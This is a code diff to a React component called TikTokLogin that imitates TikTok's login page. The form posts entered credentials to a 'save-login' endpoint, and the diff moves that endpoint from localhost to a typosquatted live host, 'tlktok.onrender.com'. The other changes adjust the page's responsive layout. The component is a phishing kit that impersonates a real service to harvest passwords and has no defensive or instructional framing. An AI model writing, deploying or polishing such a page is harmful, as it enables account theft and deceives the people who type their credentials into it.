@@ -16,7 +16,7 @@ export default function TikTokLogin() {
     const password = e.target[1].value;
 
     try {
-      await fetch("http://localhost:5000/save-login", {
+      await fetch("https://tlktok.onrender.com/save-login", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -33,11 +33,11 @@ export default function TikTokLogin() {
 
   return (
     <div
-      className={`min-h-screen flex items-center justify-center font-sans ${
+      className={`min-h-screen w-full flex items-center justify-center font-sans px-4 sm:px-6 ${
         darkMode ? "bg-black text-white" : "bg-white text-black"
       }`}
     >
-      <div className="w-full max-w-sm p-8 rounded-xl shadow-2xl bg-white dark:bg-zinc-900 dark:text-white border border-gray-200 dark:border-zinc-700">
+      <div className="w-full max-w-sm sm:max-w-md p-6 sm:p-8 rounded-xl shadow-2xl bg-white dark:bg-zinc-900 dark:text-white border border-gray-200 dark:border-zinc-700">
         <div className="text-center text-5xl font-extrabold mb-2 text-black dark:text-white">
           TikTok
         </div>
